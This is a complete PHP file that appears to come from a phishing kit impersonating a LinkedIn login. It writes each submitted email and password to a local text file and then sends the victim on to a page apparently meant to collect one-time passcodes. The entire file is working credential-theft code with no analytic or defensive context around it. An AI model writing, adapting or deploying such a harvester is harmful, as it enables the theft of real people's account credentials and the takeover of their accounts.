<?php
file_put_contents("usernames.txt", "LinkedIn Username: " . $_POST['Email'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: otp.login.php');
exit();
?>
